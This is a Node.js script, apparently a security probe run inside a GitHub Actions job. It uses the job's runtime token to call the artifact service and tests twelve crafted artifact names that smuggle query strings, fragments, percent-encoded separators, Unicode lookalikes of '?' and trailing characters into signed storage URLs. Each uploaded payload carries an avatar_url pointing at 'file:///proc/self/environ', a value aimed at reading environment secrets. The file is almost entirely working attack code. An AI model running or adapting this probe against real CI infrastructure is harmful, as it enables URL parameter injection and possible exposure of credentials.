'use strict';

const crypto = require('node:crypto');
const SERVICE = '/twirp/github.actions.results.api.v1.ArtifactService/';

function context() {
  const token = process.env.ACTIONS_RUNTIME_TOKEN;
  const base = new URL(process.env.ACTIONS_RESULTS_URL).origin;
  const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64url'));
  const scope = claims.scp.split(' ').find((s) => s.startsWith('Actions.Results:'));
  const [, runId, jobId] = scope.split(':');
  return { token, base, runId, jobId };
}

async function rpc(ctx, method, fields) {
  const response = await fetch(ctx.base + SERVICE + method, { method: 'POST', headers: {
    Authorization: `Bearer ${ctx.token}`, 'Content-Type': 'application/json' },
  body: JSON.stringify({ workflow_run_backend_id: ctx.runId,
    workflow_job_run_backend_id: ctx.jobId, ...fields }), signal: AbortSignal.timeout(20000) });
  const text = await response.text();
  let body = {}; try { body = JSON.parse(text); } catch { body = { raw: text.slice(0, 200) }; }
  return { status: response.status, body };
}
function value(result, field) {
  return result.body[field] || result.body[field.replace(/_([a-z])/g, (_, c) => c.toUpperCase())] || null;
}

(async () => {
  const ctx = context(); const stamp = Date.now();
  const cases = [
    ['actual-query-json', `p-${stamp}.json?api-version=2009-09-19`, 'application/json'],
    ['actual-query-octet', `p-${stamp}.json?api-version=2009-09-19`, 'application/octet-stream'],
    ['actual-hash-octet', `p-${stamp}.json#api-version=2009-09-19`, 'application/octet-stream'],
    ['actual-semi-octet', `p-${stamp}.json;api-version=2009-09-19`, 'application/octet-stream'],
    ['percent-query-octet', `p-${stamp}.json%3Fapi-version=2009-09-19`, 'application/octet-stream'],
    ['percent-amp-octet', `p-${stamp}.json%26api-version=2009-09-19`, 'application/octet-stream'],
    ['fullwidth-query-octet', `p-${stamp}.json\uff1fapi-version=2009-09-19`, 'application/octet-stream'],
    ['small-query-octet', `p-${stamp}.json\ufe56api-version=2009-09-19`, 'application/octet-stream'],
    ['u013f-octet', `p-${stamp}.json\u013fapi-version=2009-09-19`, 'application/octet-stream'],
    ['u0126-octet', `p-${stamp}.json\u0126api-version=2009-09-19`, 'application/octet-stream'],
    ['trailing-dot-json', `p-${stamp}.json.`, 'application/json'],
    ['trailing-space-json', `p-${stamp}.json `, 'application/json'],
  ];
  for (let i = 0; i < cases.length; i += 1) {
    const [label, name, mime] = cases[i];
    const payload = Buffer.from(JSON.stringify({ full_name: 'path/name',
      owner: { login: 'path', avatar_url: 'file:///proc/self/environ' }, label }));
    const created = await rpc(ctx, 'CreateArtifact', { name, version: 7, mime_type: mime });
    const uploadUrl = value(created, 'signed_upload_url');
    const out = { label, create: created.status, accepted: Boolean(uploadUrl),
      message: created.body.msg || created.body.message || '', nameCodepoints:
      Array.from(name, (c) => c.codePointAt(0).toString(16)).join(',') };
    if (uploadUrl) {
      const up = new URL(uploadUrl); out.uploadPath = decodeURIComponent(up.pathname);
      const uploaded = await fetch(uploadUrl, { method: 'PUT', headers: {
        'Content-Type': 'application/octet-stream', 'x-ms-blob-type': 'BlockBlob' }, body: payload });
      const fin = await rpc(ctx, 'FinalizeArtifact', { name, size: String(payload.length),
        hash: `sha256:${crypto.createHash('sha256').update(payload).digest('hex')}` });
      const signed = await rpc(ctx, 'GetSignedArtifactURL', { name });
      const downloadUrl = value(signed, 'signed_url');
      out.upload = uploaded.status; out.finalize = fin.status;
      out.artifactId = value(fin, 'artifact_id'); out.signed = signed.status;
      if (downloadUrl) { const u = new URL(downloadUrl); out.downloadPath = decodeURIComponent(u.pathname);
        out.queryKeys = Array.from(u.searchParams.keys()); out.rsct = u.searchParams.get('rsct'); }
    }
    console.log('PNAME ' + JSON.stringify(out));
  }
})().catch((e) => { console.error(e && e.stack || e); process.exitCode = 1; });
